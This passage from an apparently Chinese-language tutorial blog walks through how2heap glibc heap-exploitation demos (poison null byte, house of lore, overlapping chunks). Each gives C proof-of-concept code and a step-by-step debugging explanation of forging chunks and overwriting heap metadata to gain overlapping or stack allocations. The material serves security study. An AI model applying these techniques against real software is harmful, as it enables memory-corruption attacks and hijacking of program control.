class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当存在 off by null 的时候可以使用该技术\n&quot;</span>);<br><br>    <span class="hljs-keyword">uint8_t</span>* a;<br>    <span class="hljs-keyword">uint8_t</span>* b;<br>    <span class="hljs-keyword">uint8_t</span>* c;<br>    <span class="hljs-keyword">uint8_t</span>* b1;<br>    <span class="hljs-keyword">uint8_t</span>* b2;<br>    <span class="hljs-keyword">uint8_t</span>* d;<br>    <span class="hljs-keyword">void</span> *barrier;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请 0x100 的 chunk a\n&quot;</span>);<br>    a = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;a 在: %p\n&quot;</span>, a);<br>    <span class="hljs-keyword">int</span> real_a_size = malloc_usable_size(a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;因为我们想要溢出 chunk a，所以需要知道他的实际大小: %#x\n&quot;</span>, real_a_size);<br><br>    b = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br>    c = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>    barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;另外再申请了一个 chunk c：%p，防止 free 的时候与 top chunk 发生合并的情况\n&quot;</span>, barrier);<br><br>    <span class="hljs-keyword">uint64_t</span>* b_size_ptr = (<span class="hljs-keyword">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以要在后面一个 0x200 来绕过检查\n&quot;</span>);<br>    *(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br>    <span class="hljs-built_in">free</span>(b);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b 的 size: %#lx\n&quot;</span>, *b_size_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;假设我们写 chunk a 的时候多写了一个 0x00 在 b 的 size 的 p 位上\n&quot;</span>);<br>    a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b 现在的 size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>    <span class="hljs-keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-keyword">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;c 的 prev_size 是 %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;但他根据 chunk b 的 size 找的时候会找到 b+0x1f0 那里，我们将会成功绕过 chunk 的检测 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,*((<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>    b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请一个 0x100 大小的 b1: %p\n&quot;</span>,b1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们 malloc 了 b1 他将会放在 b 的位置，这时候 c 的 prev_size 依然是: %#lx\n&quot;</span>,*c_prev_size_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;但是我们之前写 0x200 那个地方已经改成了: %lx\n&quot;</span>,*(((<span class="hljs-keyword">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来 malloc &#x27;b2&#x27;, 作为 &#x27;victim&#x27; chunk.\n&quot;</span>);<br><br>    b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b2 申请在: %p\n&quot;</span>,b2);<br><br>    <span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 b2 填充的内容是:\n%s\n&quot;</span>,b2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在对 b1 和 c 进行 free 因为 c 的 prev_size 是 0x210，所以会把他俩给合并，但是这时候里面还包含 b2 呐.\n&quot;</span>);<br><br>    <span class="hljs-built_in">free</span>(b1);<br>    <span class="hljs-built_in">free</span>(c);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候我们申请一个 0x300 大小的 chunk 就可以覆盖着 b2 了\n&quot;</span>);<br>    d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;d 申请到了: %p，我们填充一下 d 为 \&quot;D\&quot;\n&quot;</span>,d);<br>    <span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 b2 的内容就是:\n%s\n&quot;</span>,b2);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    该技术适用的场景需要某个malloc的内存区域存在一个单字节溢出漏洞。通过溢出下一个chunk的size字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。</p><p>​    编译完成之后，单步调试。首先申请了4个chunk，分别是a、b、c和一个防止与top chunk合并的chunk。</p><p>​     <img src="https://s2.loli.net/2021/12/26/kEyFYcx7LwpUvb1.png"></p><p>​    接下来为了绕过size和next chunk的prev_size的检查，我们在chunk b的末尾伪造了一个0x200大小的prev_size</p><p> <img src="https://s2.loli.net/2021/12/26/1dlPECB5yGANDan.png"></p><p>   然后把b给free掉，通过编辑chunk a来更改b的size的最后一位为0x00。</p><p> <img src="https://s2.loli.net/2021/12/26/3lNkeFrcX4zEMi2.png"></p><p>​     这时候c那里的prev_size还是之前的，因为更改了b的size，所以找的时候会找b + 0x200的，而真正的prev_size位在0x210处，也正是这样让我们绕过了chunksize(P) = prev_size(next_chunk(P))的检测。</p><p>   接下来申请一个0x100大小的chunk，因为b已经被free了，所以glibc会将b进行切割，分出一块0x100大小的堆块给b1，剩下0xf0。</p><p> <img src="https://s2.loli.net/2021/12/26/jVTrtA6kOqgdDlS.png"></p><p>   接下来再去申请一块小于0xf0的堆块，这样就会继续分割b剩下的那一块（我们把这次申请的堆块填充上’B’来区分）。</p><p> <img src="https://s2.loli.net/2021/12/26/1vGVAkyEuctxZML.png"></p><p>   接下来free掉b1和c，因为c的prev_size仍然是0x210，按照这个去找的话就可以找到原本的b，现在的b1的位置，那么他们俩会合并，但是中间还有个b2呢。这里how2heap有一个注释。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"># <span class="hljs-function">Typically <span class="hljs-title">b2</span> <span class="hljs-params">(the victim)</span> will be a structure with valuable pointers that we want to control# 通常b2（受害者）将是一个结构，其中包含我们要控制的有价值的指针</span><br></code></pre></td></tr></table></figure><p> <img src="https://s2.loli.net/2021/12/26/42IyOtYRnhDbXLo.png"></p><p>   那么接下来的事情就是申请一块大的chunk，然后随便改写b2的内容了。</p><p> <img src="https://s2.loli.net/2021/12/26/ojxtzO3HE846lr5.png"></p><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h2><p>​    源码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span></span>&#123;<br><br>  <span class="hljs-keyword">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-keyword">intptr_t</span>* stack_buffer_2[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;定义了两个数组&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_buffer_1 在 %p\n&quot;</span>, (<span class="hljs-keyword">void</span>*)stack_buffer_1);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_buffer_2 在 %p\n&quot;</span>, (<span class="hljs-keyword">void</span>*)stack_buffer_2);<br><br>  <span class="hljs-keyword">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请第一块属于 fastbin 的 chunk 在 %p\n&quot;</span>, victim);<br>  <span class="hljs-keyword">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<span class="hljs-comment">//chunk 开始的位置</span><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;在栈上伪造一块 fake chunk\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">intptr_t</span>*)stack_buffer_2;<br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">intptr_t</span>*)stack_buffer_1;<br><br>  <span class="hljs-keyword">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;另外再分配一块，避免与 top chunk 合并 %p\n&quot;</span>, p5);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Free victim chunk %p, 他会被插入到 fastbin 中\n&quot;</span>, victim);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-keyword">void</span>*)victim);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n此时 victim chunk 的 fd、bk 为零\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="hljs-keyword">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n&quot;</span>, victim);<br>  <span class="hljs-keyword">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="hljs-keyword">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n&quot;</span>);<br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer_1;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;然后申请跟第一个 chunk 大小一样的 chunk\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n&quot;</span>);<br>  <span class="hljs-keyword">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;最后 malloc 一次会返回 victim-&gt;bk 指向的那里\n&quot;</span>);<br>  <span class="hljs-keyword">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = malloc(100)\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n&quot;</span>,stack_buffer_2[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 在栈上 %p\n&quot;</span>, p4);<br>  <span class="hljs-keyword">intptr_t</span> sc = (<span class="hljs-keyword">intptr_t</span>)jackpot;<br>  <span class="hljs-built_in">memcpy</span>((p4+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    运行结果。</p><p> <img src="https://s2.loli.net/2021/12/26/5OyWv8dVYRTa4wj.png"></p><p>​    在前面的技术中，我们已经知道怎样去伪造一个fake chunk，接下来，我们要尝试伪造一条small bins链。</p><p>​    首先创建两个chunk，第一个是我们的victim chunk，请确保它是一个small chunk，第二个随意，只是为了确保在free时victim chunk不会被合并进top chunk 里。然后，在栈上伪造两个fake chunk，让fake chunk 1的fd指向victim chunk，bk指向fake chunk 2，fake chunk 2的fd指向fake chunk 1，这样一个small bin链就差不多了。</p><p>​    如下图所示。</p><p> <img src="https://s2.loli.net/2021/12/26/RGWzOsBaIo3iklQ.png"></p><p> <img src="https://s2.loli.net/2021/12/26/JWZ3aK6tqDVk8oX.png"></p><p>​    Glibc在malloc的时候会检查small bin链表中第二块chunk的bk指针是否指向第一块，来发现对small bins的破坏。为了绕过这个检查，所以才需要同时伪造bin中的前两个chunk。</p><p>​    接下来释放掉victim chunk，它首先会被放到fast bin中，这时候我们再去malloc一个large chunk，那么就会触发fast bin的合并，然后victim chunk就放到了unsorted bin中，最终被整理到small bin中。</p><p>​    接下来的第一个相应大小的malloc，会返回victim chunk的地址，再一次malloc将返回fake chunk 1的地址，地址在栈上且我们能够控制。</p><p> <img src="https://s2.loli.net/2021/12/26/y5V1W26vkqjYgpE.png"></p><p>​    于是我们就成功地骗过了malloc在栈上分配了一个chunk。最后再想一下，其实最初的victim chunk使用fast chunk也是可以的，其释放后虽然是被加入到 fast bins中，而不是unsorted bin，但malloc之后，也会被整理到small bins里。自行尝试吧。</p><h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc , <span class="hljs-keyword">char</span>* argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">intptr_t</span> *p1,*p2,*p3,*p4;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这是一个简单的堆块重叠问题，首先申请 3 个 chunk\n&quot;</span>);<br><br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这三个 chunk 分别申请到了:\np1：%p\np2：%p\np3：%p\n给他们分别填充\&quot;1\&quot;\&quot;2\&quot;\&quot;3\&quot;\n\n&quot;</span>, p1, p2, p3);<br><br>    <span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉 p2\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p2 被放到 unsorted bin 中\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在假设有一个堆溢出漏洞，可以覆盖 p2\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;为了保证堆块稳定性，我们至少需要让 prev_inuse 为 1，确保 p1 不会被认为是空闲的堆块\n&quot;</span>);<br><br>    <span class="hljs-keyword">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;<br>    <span class="hljs-keyword">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们将 p2 的大小设置为 %d, 这样的话我们就能用 %d 大小的空间\n&quot;</span>,evil_chunk_size, evil_region_size);<br><br>    *(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// 覆盖 p2 的 size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n现在让我们分配另一个块，其大小等于块p2注入大小的数据大小\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc 将会把前面 free 的 p2 分配给我们（p2 的 size 已经被改掉了）\n&quot;</span>);<br>    p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 分配在 %p 到 %p 这一区域\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p4, (<span class="hljs-keyword">char</span> *)p4+evil_region_size);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 从 %p 到 %p\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p3, (<span class="hljs-keyword">char</span> *)p3+<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 应该与 p3 重叠，在这种情况下 p4 包括所有 p3\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候通过编辑 p4 就可以修改 p3 的内容，修改 p3 也可以修改 p4 的内容\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来验证一下，现在 p3 与 p4:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p3+<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n如果我们使用 memset(p4, &#x27;4&#x27;, %d), 将会:\n&quot;</span>, evil_region_size);<br>    <span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, 